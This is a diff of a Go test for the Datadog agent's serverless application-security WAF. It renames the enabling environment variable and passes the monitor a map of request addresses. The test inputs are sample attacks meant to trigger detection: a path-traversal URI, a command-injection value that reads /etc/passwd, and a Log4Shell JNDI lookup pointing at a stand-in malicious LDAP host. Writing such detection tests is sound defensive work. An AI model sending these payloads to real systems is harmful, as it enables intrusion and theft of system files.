@@ -9,7 +9,6 @@ import (
 	"testing"
 
 	"github.com/DataDog/datadog-agent/pkg/serverless/appsec"
-	"github.com/DataDog/datadog-agent/pkg/serverless/appsec/httpsec"
 	"github.com/DataDog/datadog-agent/pkg/serverless/appsec/waf"
 	"github.com/stretchr/testify/require"
 )
@@ -20,13 +19,13 @@ func TestNew(t *testing.T) {
 	}
 
 	t.Run("appsec disabled", func(t *testing.T) {
-		t.Setenv("DD_APPSEC_ENABLED", "false")
+		t.Setenv("DD_SERVERLESS_APPSEC_ENABLED", "false")
 		asm, _ := appsec.New()
 		require.Nil(t, asm)
 	})
 
 	t.Run("appsec enabled", func(t *testing.T) {
-		t.Setenv("DD_APPSEC_ENABLED", "true")
+		t.Setenv("DD_SERVERLESS_APPSEC_ENABLED", "true")
 		asm, err := appsec.New()
 		require.NoError(t, err)
 		require.NotNil(t, asm)
@@ -38,25 +37,25 @@ func TestMonitor(t *testing.T) {
 		t.Skip("host not supported by appsec", err)
 	}
 
-	t.Setenv("DD_APPSEC_ENABLED", "true")
+	t.Setenv("DD_SERVERLESS_APPSEC_ENABLED", "true")
 	asm, err := appsec.New()
 	require.NoError(t, err)
 	require.Nil(t, err)
 
 	uri := "/path/to/resource/../../../../../database.yml.sqlite3"
-	ctx := &httpsec.Context{
-		RequestRawURI: &uri,
-		RequestHeaders: map[string][]string{
+	addresses := map[string]interface{}{
+		"server.request.uri.raw": uri,
+		"server.request.headers.no_cookies": map[string][]string{
 			"user-agent": {"sql power injector"},
 		},
-		RequestQuery: map[string][]string{
+		"server.request.query": map[string][]string{
 			"query": {"$http_server_vars"},
 		},
-		RequestPathParams: map[string]string{
+		"server.request.path_params": map[string]string{
 			"proxy": "/path/to/resource | cat /etc/passwd |",
 		},
-		RequestBody: "eyJ0ZXN0I${jndi:ldap://16.0.2.staging.malicious.server/a}joiYm9keSJ9",
+		"server.request.body": "eyJ0ZXN0I${jndi:ldap://16.0.2.staging.malicious.server/a}joiYm9keSJ9",
 	}
-	events := asm.Monitor(ctx.ToAddresses())
+	events := asm.Monitor(addresses)
 	require.NotNil(t, events)
 }
